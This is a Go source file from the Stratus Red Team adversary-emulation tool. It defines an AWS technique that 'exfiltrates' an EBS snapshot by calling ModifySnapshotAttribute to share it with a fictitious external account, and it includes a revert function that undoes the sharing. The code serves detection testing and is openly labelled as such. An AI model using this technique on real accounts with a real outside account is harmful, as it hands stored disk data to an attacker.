package aws

import (
	"context"
	_ "embed"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.ec2-share-ebs-snapshot",
		FriendlyName:       "Exfiltrate EBS Snapshot by Sharing It",
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates an EBS snapshot by sharing it with an external AWS account.

Warm-up: 

- Create an EBS volume and a snapshot.

Detonation: 

- Call ec2:ModifySnapshotAttribute to share the snapshot with an external, fictitious AWS account.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var ShareWithAccountId = "012345678912"

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())

	// Find the snapshot to exfiltrate
	ourSnapshotId := params["snapshot_id"]

	// Exfiltrate it
	log.Println("Sharing the volume snapshot " + ourSnapshotId + " with an external AWS account...")

	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: &ourSnapshotId,
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Add: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
		},
	})
	return err
}

func revert(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	ourSnapshotId := params["snapshot_id"]

	log.Println("Unsharing the volume snapshot " + ourSnapshotId)
	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: &ourSnapshotId,
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Remove: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
		},
	})
	return err
}